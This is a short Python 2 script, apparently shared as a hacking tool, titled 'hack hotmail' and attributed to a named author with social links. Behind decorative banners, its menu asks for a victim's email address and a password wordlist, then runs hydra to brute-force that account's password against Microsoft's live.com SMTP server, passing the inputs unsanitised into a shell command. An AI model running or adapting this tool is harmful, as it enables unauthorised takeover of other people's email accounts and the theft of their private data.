#!/usr/bin/python
'''create by ali qassem (antqame) '''
from requests import *
import smtplib
import os
################################################################################
#colors
wi = "\033[1;37m"
rd = "\033[1;31m"
gr = "\033[1;32m"
yl = "\033[1;33m"
bl = "\033[1;34m"
################################################################################
def banner():
    print(rd)+'''  

 
 
#   .----------------.  .-----------------. .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
#  | .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
#  | |      __      | || | ____  _____  | || |  _________   | || |    ___       | || |      __      | || | ____    ____ | || |  _________   | |
#  | |     /  \     | || ||_   \|_   _| | || | |  _   _  |  | || |  .'   '.     | || |     /  \     | || ||_   \  /   _|| || | |_   ___  |  | |
#  | |    / /\ \    | || |  |   \ | |   | || | |_/ | | \_|  | || | /  .-.  \    | || |    / /\ \    | || |  |   \/   |  | || |   | |_  \_|  | |
#  | |   / ____ \   | || |  | |\ \| |   | || |     | |      | || | | |   | |    | || |   / ____ \   | || |  | |\  /| |  | || |   |  _|  _   | |
#  | | _/ /    \ \_ | || | _| |_\   |_  | || |    _| |_     | || | \  `-'  \_   | || | _/ /    \ \_ | || | _| |_\/_| |_ | || |  _| |___/ |  | |
#  | ||____|  |____|| || ||_____|\____| | || |   |_____|    | || |  `.___.\__|  | || ||____|  |____|| || ||_____||_____|| || | |_________|  | |
#  | |              | || |              | || |              | || |              | || |              | || |              | || |              | |
#  | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
#   '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'                                                        
    '''
banner()
def the_show():
    print(yl)+'''

                                     !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
                                     !                                   |                                       !
                                     !-------------------Author : ANtqAmE (ALi Qasseim)--------------------------!
                                     !                                                                           !
                                     !-------------Name_script:   hack hotmail             , V 2.0---------------!
                                     !                                                                           !
                                     !------------website : http://www.antqame.blogspot.com----------------------!
                                     !                                                                           !
                                     !------------facebook :https://www.facebook.com/ANtqAmE---------------------!
                                     !                                                                           !
                                     !--------youtube:https://www.youtube.com/channel/UC1QRVK_K4jWPDXm798orw-g---!
                                     !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

    '''
the_show()
print '[1] start the attack'
print '[2] exit'
option = input('==>')
if option == 1:
   email = str(raw_input(" Enter Email victim's : "))
   password = str(raw_input(" Enter path of wordlist : "))
   os.system("hydra smtp.live.com smtp -l %s -P %s -w 1 -s 587 -sS -v -V" % (email,password))